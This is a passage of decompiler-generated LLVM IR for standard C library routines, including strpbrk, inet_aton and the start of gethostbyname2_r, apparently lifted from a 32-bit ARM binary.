  br label %dec_label_pc_1bab4

dec_label_pc_1bab4:                               ; preds = %dec_label_pc_1bb50, %dec_label_pc_1baf0, %dec_label_pc_1baa8
  %v0_1bb18 = phi i32 [ %v0_1baac, %dec_label_pc_1baa8 ], [ %v4_1bab4, %dec_label_pc_1baf0 ], [ %v4_1bab4, %dec_label_pc_1bb50 ]
  %v1_1bab4 = inttoptr i32 %v0_1bb18 to i32*
  %v2_1bab4 = load i32, i32* %v1_1bab4, align 4
  %v4_1bab4 = add i32 %v0_1bb18, 4
  %v2_1babc = xor i32 %v2_1bab4, %v5_1bab0
  %v2_1bac0 = add i32 %v2_1babc, 2130640639
  store i32 %v2_1bac0, i32* @ip, align 4
  %v2_1bac8 = add i32 %v2_1bab4, 2130640639
  %v1_1bacc = sub i32 -1, %v2_1bab4
  %v2_1bad0 = xor i32 %v2_1bac8, %v1_1bacc
  %v2_1badc = and i32 %v2_1bad0, -2130640640
  %v2_1bae4 = icmp eq i32 %v2_1badc, 0
  br i1 %v2_1bae4, label %dec_label_pc_1baf0, label %dec_label_pc_1baf8

dec_label_pc_1baf0:                               ; preds = %dec_label_pc_1bab4
  %v1_1bad8 = sub i32 -1, %v2_1babc
  %v2_1bae0 = xor i32 %v2_1bac0, %v1_1bad8
  %v2_1bae8 = and i32 %v2_1bae0, -2130640640
  %v2_1baf0 = icmp eq i32 %v2_1bae8, 0
  br i1 %v2_1baf0, label %dec_label_pc_1bab4, label %dec_label_pc_1baf8

dec_label_pc_1baf8:                               ; preds = %dec_label_pc_1bab4, %dec_label_pc_1baf0
  %v2_1baf8 = inttoptr i32 %v0_1bb18 to i8*
  %v3_1baf8 = load i8, i8* %v2_1baf8, align 1
  %v4_1baf8 = zext i8 %v3_1baf8 to i32
  %v9_1bafc = icmp eq i32 %v4_1baf8, %v1_1ba80
  br i1 %v9_1bafc, label %dec_label_pc_1bb58, label %dec_label_pc_1bb08

dec_label_pc_1bb08:                               ; preds = %dec_label_pc_1baf8
  %v2_1bb08 = icmp eq i8 %v3_1baf8, 0
  br i1 %v2_1bb08, label %dec_label_pc_1bb58, label %dec_label_pc_1bb10

dec_label_pc_1bb10:                               ; preds = %dec_label_pc_1bb08
  %v1_1bb10 = add i32 %v0_1bb18, 1
  %v2_1bb10 = inttoptr i32 %v1_1bb10 to i8*
  %v3_1bb10 = load i8, i8* %v2_1bb10, align 1
  %v4_1bb10 = zext i8 %v3_1bb10 to i32
  %v9_1bb14 = icmp eq i32 %v4_1bb10, %v1_1ba80
  br i1 %v9_1bb14, label %dec_label_pc_1bb58, label %dec_label_pc_1bb20

dec_label_pc_1bb20:                               ; preds = %dec_label_pc_1bb10
  %v2_1bb20 = icmp eq i8 %v3_1bb10, 0
  br i1 %v2_1bb20, label %dec_label_pc_1bb58, label %dec_label_pc_1bb28

dec_label_pc_1bb28:                               ; preds = %dec_label_pc_1bb20
  %v1_1bb28 = add i32 %v0_1bb18, 2
  %v2_1bb28 = inttoptr i32 %v1_1bb28 to i8*
  %v3_1bb28 = load i8, i8* %v2_1bb28, align 1
  %v4_1bb28 = zext i8 %v3_1bb28 to i32
  %v9_1bb2c = icmp eq i32 %v4_1bb28, %v1_1ba80
  br i1 %v9_1bb2c, label %dec_label_pc_1bb58, label %dec_label_pc_1bb38

dec_label_pc_1bb38:                               ; preds = %dec_label_pc_1bb28
  %v2_1bb38 = icmp eq i8 %v3_1bb28, 0
  br i1 %v2_1bb38, label %dec_label_pc_1bb58, label %dec_label_pc_1bb40

dec_label_pc_1bb40:                               ; preds = %dec_label_pc_1bb38
  %v1_1bb40 = add i32 %v0_1bb18, 3
  %v2_1bb40 = inttoptr i32 %v1_1bb40 to i8*
  %v3_1bb40 = load i8, i8* %v2_1bb40, align 1
  %v4_1bb40 = zext i8 %v3_1bb40 to i32
  %v9_1bb44 = icmp eq i32 %v4_1bb40, %v1_1ba80
  br i1 %v9_1bb44, label %dec_label_pc_1bb58, label %dec_label_pc_1bb50

dec_label_pc_1bb50:                               ; preds = %dec_label_pc_1bb40
  %v2_1bb50 = icmp eq i8 %v3_1bb40, 0
  br i1 %v2_1bb50, label %dec_label_pc_1bb58, label %dec_label_pc_1bab4

dec_label_pc_1bb58:                               ; preds = %dec_label_pc_1ba94, %dec_label_pc_1ba88, %dec_label_pc_1bb50, %dec_label_pc_1bb40, %dec_label_pc_1bb38, %dec_label_pc_1bb28, %dec_label_pc_1bb20, %dec_label_pc_1bb10, %dec_label_pc_1bb08, %dec_label_pc_1baf8
  %v1_1bb5c = phi i32 [ %v1_1bb40, %dec_label_pc_1bb50 ], [ %v1_1bb40, %dec_label_pc_1bb40 ], [ %v1_1bb28, %dec_label_pc_1bb38 ], [ %v1_1bb28, %dec_label_pc_1bb28 ], [ %v1_1bb10, %dec_label_pc_1bb20 ], [ %v1_1bb10, %dec_label_pc_1bb10 ], [ %v0_1bb18, %dec_label_pc_1bb08 ], [ %v0_1bb18, %dec_label_pc_1baf8 ], [ %v0_1ba9c, %dec_label_pc_1ba88 ], [ %v0_1ba9c, %dec_label_pc_1ba94 ]
  ret i32 %v1_1bb5c

; uselistorder directives
  uselistorder i32 %v4_1bab4, { 1, 0 }
  uselistorder i32 %v2_1bab4, { 0, 2, 1 }
  uselistorder i32 %v0_1bb18, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v5_1baa8, { 1, 0 }
  uselistorder i32 %v1_1ba9c, { 1, 0, 2 }
  uselistorder i32 %v0_1baa02, { 2, 1, 0 }
  uselistorder i32 %v1_1ba80, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 -2130640640, { 0, 1, 2, 6, 3, 4, 5 }
  uselistorder i32 2130640639, { 2, 6, 7, 3, 0, 8, 9, 4, 1, 5, 10 }
  uselistorder label %dec_label_pc_1bb58, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_1baf8, { 1, 0 }
  uselistorder label %dec_label_pc_1ba88, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1bb94

dec_label_pc_1bb70:                               ; preds = %dec_label_pc_1bb80
  %v3_1bb80 = zext i8 %v2_1bb80 to i32
  %v1_1bb88 = add i32 %v0_1bb88, 1
  %v1_1bb70 = load i32, i32* %r0.global-to-local, align 4
  %v9_1bb70 = icmp eq i32 %v3_1bb80, %v1_1bb70
  br i1 %v9_1bb70, label %dec_label_pc_1bb78, label %dec_label_pc_1bb80

dec_label_pc_1bb78:                               ; preds = %dec_label_pc_1bb70
  %v0_1bb78 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_1bb78, i32* %r0.global-to-local, align 4
  ret i32 %v0_1bb78

dec_label_pc_1bb80:                               ; preds = %dec_label_pc_1bb70, %dec_label_pc_1bb94
  %v0_1bb88 = phi i32 [ %v1_1bb88, %dec_label_pc_1bb70 ], [ %arg2, %dec_label_pc_1bb94 ]
  %v1_1bb80 = inttoptr i32 %v0_1bb88 to i8*
  %v2_1bb80 = load i8, i8* %v1_1bb80, align 1
  %v2_1bb84 = icmp eq i8 %v2_1bb80, 0
  br i1 %v2_1bb84, label %dec_label_pc_1bb90, label %dec_label_pc_1bb70

dec_label_pc_1bb90:                               ; preds = %dec_label_pc_1bb80
  %v0_1bb90 = load i32, i32* %r2.global-to-local, align 4
  %v1_1bb90 = add i32 %v0_1bb90, 1
  br label %dec_label_pc_1bb94

dec_label_pc_1bb94:                               ; preds = %entry, %dec_label_pc_1bb90
  %storemerge = phi i32 [ %tmp, %entry ], [ %v1_1bb90, %dec_label_pc_1bb90 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_1bb94 = inttoptr i32 %storemerge to i8*
  %v2_1bb94 = load i8, i8* %v1_1bb94, align 1
  %v3_1bb94 = zext i8 %v2_1bb94 to i32
  store i32 %v3_1bb94, i32* %r0.global-to-local, align 4
  %v2_1bb98 = icmp eq i8 %v2_1bb94, 0
  %v0_1bb9c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1bb98, i32 %v0_1bb9c)
  br label %dec_label_pc_1bb80

; uselistorder directives
  uselistorder i32 %v0_1bb88, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1bb94, { 1, 0 }
  uselistorder label %dec_label_pc_1bb80, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_1bba8 = load i32, i32* @r4, align 4
  store i32 %v3_1bba8, i32* %stack_var_-28, align 4
  %v0_1bbb0 = load i32, i32* %r0.global-to-local, align 4
  %v2_1bbb0 = icmp eq i32 %v0_1bbb0, 0
  br i1 %v2_1bbb0, label %dec_label_pc_1bc8c, label %dec_label_pc_1bbc0

dec_label_pc_1bbc0:                               ; preds = %entry
  br label %dec_label_pc_1bbd8

dec_label_pc_1bbd8:                               ; preds = %dec_label_pc_1bbc0, %dec_label_pc_1bc50
  %v1_1bc50 = phi i32 [ 0, %dec_label_pc_1bbc0 ], [ %v5_1bc50, %dec_label_pc_1bc50 ]
  %v0_1bc54 = phi i32 [ 1, %dec_label_pc_1bbc0 ], [ %v1_1bc54, %dec_label_pc_1bc50 ]
  %v0_1bbd8 = phi i32 [ %v0_1bbb0, %dec_label_pc_1bbc0 ], [ %v0_1bbd812, %dec_label_pc_1bc50 ]
  %v1_1bbd8 = inttoptr i32 %v0_1bbd8 to i8*
  %v2_1bbd8 = load i8, i8* %v1_1bbd8, align 1
  %v3_1bbd8 = zext i8 %v2_1bbd8 to i32
  %v4_1bbdc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 532) to i32*), align 4
  %v2_1bbe0 = mul nuw nsw i32 %v3_1bbd8, 2
  %v2_1bbe4 = add i32 %v2_1bbe0, %v4_1bbdc
  %v3_1bbe4 = inttoptr i32 %v2_1bbe4 to i16*
  %v4_1bbe4 = load i16, i16* %v3_1bbe4, align 2
  %v1_1bbe8 = and i16 %v4_1bbe4, 8
  %v2_1bbe8 = icmp eq i16 %v1_1bbe8, 0
  br i1 %v2_1bbe8, label %dec_label_pc_1bc8c, label %dec_label_pc_1bbf0

dec_label_pc_1bbf0:                               ; preds = %dec_label_pc_1bbd8
  br label %dec_label_pc_1bc10

dec_label_pc_1bbf8:                               ; preds = %dec_label_pc_1bc10
  %v2_1bbf8 = mul i32 %v0_1bc50, 10
  %v1_1bbfc = add i32 %v2_1bbf8, -48
  %v2_1bc00 = add i32 %v3_1bc10, %v1_1bbfc
  %v8_1bc08 = icmp sgt i32 %v2_1bc00, 255
  br i1 %v8_1bc08, label %dec_label_pc_1bc8c, label %dec_label_pc_1bc0c

dec_label_pc_1bc0c:                               ; preds = %dec_label_pc_1bbf8
  %v1_1bc0c = add i32 %v0_1bc40, 1
  store i32 %v1_1bc0c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1bc10

dec_label_pc_1bc10:                               ; preds = %dec_label_pc_1bbf0, %dec_label_pc_1bc0c
  %v0_1bc50 = phi i32 [ 0, %dec_label_pc_1bbf0 ], [ %v2_1bc00, %dec_label_pc_1bc0c ]
  %v0_1bc40 = phi i32 [ %v0_1bbd8, %dec_label_pc_1bbf0 ], [ %v1_1bc0c, %dec_label_pc_1bc0c ]
  %v1_1bc10 = inttoptr i32 %v0_1bc40 to i8*
  %v2_1bc10 = load i8, i8* %v1_1bc10, align 1
  %v3_1bc10 = zext i8 %v2_1bc10 to i32
  %v2_1bc14 = mul nuw nsw i32 %v3_1bc10, 2
  %v2_1bc18 = add i32 %v2_1bc14, %v4_1bbdc
  %v3_1bc18 = inttoptr i32 %v2_1bc18 to i16*
  %v4_1bc18 = load i16, i16* %v3_1bc18, align 2
  %v6_1bc18 = zext i16 %v4_1bc18 to i32
  %v1_1bc1c = and i32 %v6_1bc18, 8
  %v2_1bc1c = icmp eq i32 %v1_1bc1c, 0
  br i1 %v2_1bc1c, label %dec_label_pc_1bc24, label %dec_label_pc_1bbf8

dec_label_pc_1bc24:                               ; preds = %dec_label_pc_1bc10
  %v7_1bc24 = icmp eq i32 %v0_1bc54, 4
  br i1 %v7_1bc24, label %dec_label_pc_1bc3c, label %dec_label_pc_1bc2c

dec_label_pc_1bc2c:                               ; preds = %dec_label_pc_1bc24
  %v7_1bc2c = icmp eq i8 %v2_1bc10, 46
  br i1 %v7_1bc2c, label %dec_label_pc_1bc34, label %dec_label_pc_1bc8c

dec_label_pc_1bc34:                               ; preds = %dec_label_pc_1bc2c
  %v1_1bc34 = add i32 %v0_1bc40, 1
  store i32 %v1_1bc34, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1bc50

dec_label_pc_1bc3c:                               ; preds = %dec_label_pc_1bc24
  %v2_1bc3c = icmp eq i8 %v2_1bc10, 0
  %v1_1bc40 = add i32 %v0_1bc40, 1
  store i32 %v1_1bc40, i32* %r0.global-to-local, align 4
  br i1 %v2_1bc3c, label %dec_label_pc_1bc50, label %dec_label_pc_1bc48

dec_label_pc_1bc48:                               ; preds = %dec_label_pc_1bc3c
  %v1_1bc48 = and i32 %v6_1bc18, 32
  %v2_1bc48 = icmp eq i32 %v1_1bc48, 0
  br i1 %v2_1bc48, label %dec_label_pc_1bc8c, label %dec_label_pc_1bc50

dec_label_pc_1bc50:                               ; preds = %dec_label_pc_1bc48, %dec_label_pc_1bc3c, %dec_label_pc_1bc34
  %v0_1bbd812 = phi i32 [ %v1_1bc40, %dec_label_pc_1bc48 ], [ %v1_1bc40, %dec_label_pc_1bc3c ], [ %v1_1bc34, %dec_label_pc_1bc34 ]
  %v4_1bc50 = mul i32 %v1_1bc50, 256
  %v5_1bc50 = or i32 %v0_1bc50, %v4_1bc50
  %v1_1bc54 = add nuw nsw i32 %v0_1bc54, 1
  %v7_1bc5c = icmp slt i32 %v1_1bc54, 5
  br i1 %v7_1bc5c, label %dec_label_pc_1bbd8, label %dec_label_pc_1bc60

dec_label_pc_1bc60:                               ; preds = %dec_label_pc_1bc50
  %v2_1bc60 = icmp eq i32 %arg2, 0
  br i1 %v2_1bc60, label %.thread7.thread, label %bb

.thread7.thread:                                  ; preds = %dec_label_pc_1bc60
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1bc90

bb:                                               ; preds = %dec_label_pc_1bc60
  %v4_1bc64 = udiv i32 %v5_1bc50, 16777216
  %v2_1bc68 = udiv i32 %v5_1bc50, 256
  %v5_1bc6c = and i32 %v2_1bc68, 65280
  %v2_1bc70 = and i32 %v5_1bc50, 65280
  %v5_1bc74 = mul nuw nsw i32 %v2_1bc70, 256
  %v5_1bc78 = mul i32 %v0_1bc50, 16777216
  %v6_1bc6c = or i32 %v4_1bc64, %v5_1bc78
  %v6_1bc74 = or i32 %v6_1bc6c, %v5_1bc6c
  %v6_1bc78 = or i32 %v6_1bc74, %v5_1bc74
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_1bc84 = inttoptr i32 %arg2 to i32*
  store i32 %v6_1bc78, i32* %v3_1bc84, align 4
  %v2_1bc90.pre = load i32, i32* %stack_var_-28, align 4
  %v1_1bc94.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1bc90

dec_label_pc_1bc8c:                               ; preds = %dec_label_pc_1bc2c, %dec_label_pc_1bc48, %dec_label_pc_1bbd8, %dec_label_pc_1bbf8, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1bc90

dec_label_pc_1bc90:                               ; preds = %.thread7.thread, %bb, %dec_label_pc_1bc8c
  %v1_1bc94 = phi i32 [ %v1_1bc94.pre, %bb ], [ 0, %dec_label_pc_1bc8c ], [ 1, %.thread7.thread ]
  %v2_1bc90 = phi i32 [ %v2_1bc90.pre, %bb ], [ %v3_1bba8, %dec_label_pc_1bc8c ], [ %v3_1bba8, %.thread7.thread ]
  store i32 %v2_1bc90, i32* @r4, align 4
  ret i32 %v1_1bc94

; uselistorder directives
  uselistorder i32 %v1_1bc54, { 1, 0 }
  uselistorder i32 %v5_1bc50, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1bc40, { 0, 1, 3, 2 }
  uselistorder i32* %r0.global-to-local, { 5, 3, 4, 2, 6, 7, 8, 0, 1 }
  uselistorder i32 65280, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_1bc90, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1bc8c, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_1bc10, { 1, 0 }
  uselistorder label %dec_label_pc_1bbd8, { 1, 0 }
}

define i32 @gethostbyname2_r(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %v9_1bca0 = load i32, i32* @r6, align 4
  %v12_1bca0 = load i32, i32* @r7, align 4
  %v15_1bca0 = load i32, i32* @r8, align 4
  %v18_1bca0 = load i32, i32* @sb, align 4
  %v21_1bca0 = load i32, i32* @sl, align 4
  %v24_1bca0 = load i32, i32* @fp, align 4
  %v7_1bca4 = icmp eq i32 %arg2, 2
  store i32 %arg2, i32* @r4, align 4
  store i32 %tmp, i32* @r6, align 4
  store i32 %arg4, i32* @r8, align 4
  store i32 %arg1, i32* @sb, align 4
  store i32 %arg5, i32* @sl, align 4
  store i32 %arg7, i32* @fp, align 4
  br i1 %v7_1bca4, label %dec_label_pc_1bcc8, label %dec_label_pc_1bce8

dec_label_pc_1bcc8:                               ; preds = %entry
  store i32 %arg6, i32* @ip, align 4
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg4, i32* @r2, align 4
  store i32 %arg5, i32* @r3, align 4
  %v0_1bce0 = call i32 @gethostbyname_r()
  store i32 %v0_1bce0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1bf34

dec_label_pc_1bce8:                               ; preds = %entry
  store i32 %arg6, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  %v7_1bcf0 = icmp eq i32 %arg2, 10
  %v2_1bcf4 = inttoptr i32 %arg6 to i32*
  store i32 0, i32* %v2_1bcf4, align 4
  br i1 %v7_1bcf0, label %dec_label_pc_1bcfc, label %dec_label_pc_1bf30

dec_label_pc_1bcfc:                               ; preds = %dec_label_pc_1bce8
  %v1_1bcfc = load i32, i32* @r7, align 4
  %v9_1bcfc = icmp eq i32 %v1_1bcfc, %arg1
  br i1 %v9_1bcfc, label %dec_label_pc_1bf30, label %dec_label_pc_1bd04

dec_label_pc_1bd04:                               ; preds = %dec_label_pc_1bcfc
  %v0_1bd04 = call i32 @__GI___errno_location()
  store i32 %v0_1bd04, i32* %r0.global-to-local, align 4
  store i32 %arg6, i32* %ip.global-to-local, align 4
  store i32 %v0_1bd04, i32* @r5, align 4
  %v0_1bd10 = load i32, i32* @r4, align 4
  %v0_1bd14 = load i32, i32* @r6, align 4
  store i32 %v0_1bd14, i32* %r2.global-to-local, align 4
  %v1_1bd18 = inttoptr i32 %v0_1bd04 to i32*
  %v2_1bd18 = load i32, i32* %v1_1bd18, align 4
  store i32 %v2_1bd18, i32* @r4, align 4
  %v0_1bd1c = load i32, i32* @r8, align 4
  store i32 %v0_1bd1c, i32* %r3.global-to-local, align 4
  %v0_1bd20 = load i32, i32* @r7, align 4
  store i32 %v0_1bd20, i32* %v1_1bd18, align 4
  %v0_1bd24 = load i32, i32* @sb, align 4
  store i32 %v0_1bd24, i32* %r0.global-to-local, align 4
  %v2_1bd28 = load i32, i32* @sl, align 4
  %v5_1bd28 = load i32, i32* %ip.global-to-local, align 4
  %v0_1bd2c = load i32, i32* @fp, align 4
  %v7_1bd30 = call i32 @__get_hosts_byname_r(i32 %v0_1bd24, i32 %v0_1bd10, i32 %v0_1bd14, i32 %v0_1bd1c, i32 %v2_1bd28, i32 %v5_1bd28, i32 %v0_1bd2c)
  store i32 %v7_1bd30, i32* %r0.global-to-local, align 4
  %v2_1bd34 = icmp eq i32 %v7_1bd30, 0
  br i1 %v2_1bd34, label %bb, label %dec_label_pc_1bd40

bb:                                               ; preds = %dec_label_pc_1bd04
  %v1_1bd38 = load i32, i32* @r4, align 4
  %v2_1bd38 = load i32, i32* @r5, align 4
  %v3_1bd38 = inttoptr i32 %v2_1bd38 to i32*
  store i32 %v1_1bd38, i32* %v3_1bd38, align 4
  br label %dec_label_pc_1bf34

dec_label_pc_1bd40:                               ; preds = %dec_label_pc_1bd04
  %v0_1bd40 = load i32, i32* @fp, align 4
  %v1_1bd40 = inttoptr i32 %v0_1bd40 to i32*
  %v2_1bd40 = load i32, i32* %v1_1bd40, align 4
  store i32 %v2_1bd40, i32* %r3.global-to-local, align 4
  %v7_1bd44 = icmp eq i32 %v2_1bd40, 1
  br i1 %v7_1bd44, label %dec_label_pc_1bd60, label %dec_label_pc_1bd4c

dec_label_pc_1bd4c:                               ; preds = %dec_label_pc_1bd40
  %v7_1bd4c = icmp eq i32 %v2_1bd40, 4
  br i1 %v7_1bd4c, label %dec_label_pc_1bd7c, label %dec_label_pc_1bd54

dec_label_pc_1bd54:                               ; preds = %dec_label_pc_1bd4c
  %v3_1bd54 = icmp eq i32 %v2_1bd40, -1
  br i1 %v3_1bd54, label %dec_label_pc_1bd70, label %dec_label_pc_1bf34

dec_label_pc_1bd60:                               ; preds = %dec_label_pc_1bd40
  %v7_1bd60 = icmp eq i32 %v7_1bd30, 2
  br i1 %v7_1bd60, label %.thread1, label %bb29

bb29:                                             ; preds = %dec_label_pc_1bd60
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_1bd80

.thread1:                                         ; preds = %dec_label_pc_1bd60
  store i32 1, i32* @r7, align 4
  br label %dec_label_pc_1bd80

dec_label_pc_1bd70:                               ; preds = %dec_label_pc_1bd54
  %v0_1bd70 = load i32, i32* @r5, align 4
  %v1_1bd70 = inttoptr i32 %v0_1bd70 to i32*
  %v2_1bd70 = load i32, i32* %v1_1bd70, align 4
  store i32 %v2_1bd70, i32* %r3.global-to-local, align 4
  %v7_1bd74 = icmp eq i32 %v2_1bd70, 2
  br i1 %v7_1bd74, label %dec_label_pc_1bd7c, label %dec_label_pc_1bf34

dec_label_pc_1bd7c:                               ; preds = %dec_label_pc_1bd70, %dec_label_pc_1bd4c
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_1bd80

dec_label_pc_1bd80:                               ; preds = %bb29, %.thread1, %dec_label_pc_1bd7c
  %v0_1bd80 = load i32, i32* @r8, align 4
  %v1_1bd80 = sub i32 0, %v0_1bd80
  %v1_1bd84 = urem i32 %v1_1bd80, 4
  store i32 %v1_1bd84, i32* %r0.global-to-local, align 4
  %v1_1bd88 = load i32, i32* @sl, align 4
  %v2_1bd88 = sub i32 %v1_1bd88, %v1_1bd84
  %v1_1bd8c = add i32 %v2_1bd88, -24
  store i32 %v1_1bd8c, i32* @sl, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_1bd98 = load i32, i32* @r4, align 4
  %v1_1bd98 = load i32, i32* @r5, align 4
  %v2_1bd98 = inttoptr i32 %v1_1bd98 to i32*
  store i32 %v0_1bd98, i32* %v2_1bd98, align 4
  %v7_1bd9c = icmp sgt i32 %v1_1bd8c, 255
  br i1 %v7_1bd9c, label %dec_label_pc_1bda8, label %bb30

bb30:                                             ; preds = %dec_label_pc_1bd80
  store i32 34, i32* %r0.global-to-local, align 4
  %v0_1bda0 = load i32, i32* %r3.global-to-local, align 4
  %v1_1bda0 = load i32, i32* @fp, align 4
  %v2_1bda0 = inttoptr i32 %v1_1bda0 to i32*
  store i32 %v0_1bda0, i32* %v2_1bda0, align 4
  br label %dec_label_pc_1bf34

dec_label_pc_1bda8:                               ; preds = %dec_label_pc_1bd80
  %v0_1bda03 = load i32, i32* %r3.global-to-local, align 4
  %v1_1bda04 = load i32, i32* @fp, align 4
  %v2_1bda05 = inttoptr i32 %v1_1bda04 to i32*
  store i32 %v0_1bda03, i32* %v2_1bda05, align 4
  %v0_1bda8 = load i32, i32* @r8, align 4
  %v1_1bda8 = load i32, i32* %r0.global-to-local, align 4
  %v2_1bda8 = add i32 %v1_1bda8, %v0_1bda8
  store i32 %v2_1bda8, i32* @r8, align 4
  store i32 0, i32* @r4, align 4
  %v1_1bdb0 = add i32 %v2_1bda8, 16
  store i32 %v1_1bdb0, i32* %r2.global-to-local, align 4
  %v1_1bdb4 = add i32 %v2_1bda8, 24
  store i32 %v1_1bdb4, i32* @r5, align 4
  %v3_1bdbc = inttoptr i32 %v1_1bdb0 to i32*
  store i32 %v2_1bda8, i32* %v3_1bdbc, align 4
  %v0_1bdc0 = load i32, i32* @sb, align 4
  store i32 %v0_1bdc0, i32* @r1, align 4
  %v0_1bdc4 = load i32, i32* @r4, align 4
  %v1_1bdc4 = load i32, i32* %r2.global-to-local, align 4
  %v2_1bdc4 = add i32 %v1_1bdc4, 4
  %v3_1bdc4 = inttoptr i32 %v2_1bdc4 to i32*
  store i32 %v0_1bdc4, i32* %v3_1bdc4, align 4
  %v0_1bdc8 = load i32, i32* @r5, align 4
  store i32 %v0_1bdc8, i32* %r0.global-to-local, align 4
  %v0_1bdcc = load i32, i32* @sl, align 4
  store i32 %v0_1bdcc, i32* %r2.global-to-local, align 4
  %v3_1bdd0 = call i32 @strncpy(i32 %v0_1bdc8, i32 %v0_1bdc0, i32 %v0_1bdcc)
  %v0_1bdd4 = load i32, i32* @r4, align 4
  %v1_1bdd4 = trunc i32 %v0_1bdd4 to i8
  %v2_1bdd4 = load i32, i32* @r5, align 4
  %v3_1bdd4 = load i32, i32* @sl, align 4
  %v4_1bdd4 = add i32 %v3_1bdd4, %v2_1bdd4
  %v5_1bdd4 = inttoptr i32 %v4_1bdd4 to i8*
  store i8 %v1_1bdd4, i8* %v5_1bdd4, align 1
  %v0_1bdd8 = load i32, i32* @sb, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  %v0_1bde0 = load i32, i32* @r8, align 4
  store i32 %v0_1bde0, i32* %r2.global-to-local, align 4
  %v3_1bde4 = inttoptr i32 %v0_1bdd8 to i8*
  %v4_1bde4 = call i32 @inet_pton(i32 10, i8* %v3_1bde4, i32 %v0_1bde0)
  store i32 %v4_1bde4, i32* %r0.global-to-local, align 4
  %v1_1bde8 = load i32, i32* @r4, align 4
  %v9_1bde8 = icmp eq i32 %v4_1bde4, %v1_1bde8
  br i1 %v9_1bde8, label %dec_label_pc_1be20, label %dec_label_pc_1bdf0

dec_label_pc_1bdf0:                               ; preds = %dec_label_pc_1bda8
  store i32 %v1_1bdb0, i32* @ip, align 4
  %v0_1bdf8 = load i32, i32* @r6, align 4
  store i32 %v0_1bdf8, i32* %v2_1bcf4, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v1_1be00 = load i32, i32* @r6, align 4
  %v2_1be00 = add i32 %v1_1be00, 8
  %v3_1be00 = inttoptr i32 %v2_1be00 to i32*
  store i32 10, i32* %v3_1be00, align 4
  %v0_1be04 = load i32, i32* @r4, align 4
  store i32 %v0_1be04, i32* %r0.global-to-local, align 4
  %v0_1be08 = load i32, i32* %r3.global-to-local, align 4
  %v1_1be08 = add i32 %v0_1be08, 6
  store i32 %v1_1be08, i32* %r3.global-to-local, align 4
  %v1_1be0c = load i32, i32* @r6, align 4
  %v2_1be0c = add i32 %v1_1be0c, 12
  %v3_1be0c = inttoptr i32 %v2_1be0c to i32*
  store i32 %v1_1be08, i32* %v3_1be0c, align 4
  %v0_1be10 = load i32, i32* @r5, align 4
  %v1_1be10 = load i32, i32* @r6, align 4
  %v2_1be10 = inttoptr i32 %v1_1be10 to i32*
  store i32 %v0_1be10, i32* %v2_1be10, align 4
  %v0_1be14 = load i32, i32* @ip, align 4
  %v1_1be14 = load i32, i32* @r6, align 4
  %v2_1be14 = add i32 %v1_1be14, 16
  %v3_1be14 = inttoptr i32 %v2_1be14 to i32*
  store i32 %v0_1be14, i32* %v3_1be14, align 4
  %v0_1be18 = load i32, i32* @r4, align 4
  %v1_1be18 = load i32, i32* @fp, align 4
  %v2_1be18 = inttoptr i32 %v1_1be18 to i32*
  store i32 %v0_1be18, i32* %v2_1be18, align 4
  br label %dec_label_pc_1bf34

dec_label_pc_1be20:                               ; preds = %dec_label_pc_1bda8
  %v0_1be20 = load i32, i32* @r7, align 4
  %v2_1be20 = icmp eq i32 %v0_1be20, 0
  br i1 %v2_1be20, label %dec_label_pc_1be28, label %dec_label_pc_1bf20

dec_label_pc_1be28:                               ; preds = %dec_label_pc_1be20
  %v2_1be28 = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v2_1be28, i32* @r4, align 4
  store i32 %v2_1be28, i32* %r0.global-to-local, align 4
  store i32 40, i32* @r2, align 4
